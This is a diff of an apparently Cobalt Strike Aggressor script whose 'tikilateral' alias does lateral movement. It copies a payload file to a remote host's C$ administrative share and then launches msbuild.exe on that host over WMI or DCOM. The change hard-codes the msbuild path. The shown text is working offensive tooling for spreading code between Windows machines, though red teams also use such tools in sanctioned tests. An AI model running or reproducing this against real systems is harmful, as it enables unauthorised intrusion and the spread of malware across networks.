@@ -128,8 +128,8 @@ alias tikilateral {
 
 		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.xml", $final);
 
-		if ($arch eq "x64") { $buildPath = "%windir%\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe"; }
-		else if ($arch eq "x86") { $buildPath = "%windir%\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe"; }
+		if ($arch eq "x64") { $buildPath = "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe"; }
+		else if ($arch eq "x86") { $buildPath = "c:\\windows\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe"; }
 
 		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $buildPath $+  c:\\windows\\temp\\tikispawn.xml\"  $+ $m1 $+ "); }
 		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $buildPath $+  c:\\windows\\temp\\tikispawn.xml  $+ $m1 $+ "); }
@@ -157,7 +157,6 @@ alias tikilateral {
 	} else if ($payload eq "powershell") {
 		#brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.ps1");
 	}
-
 }
 
 alias tikiexec {
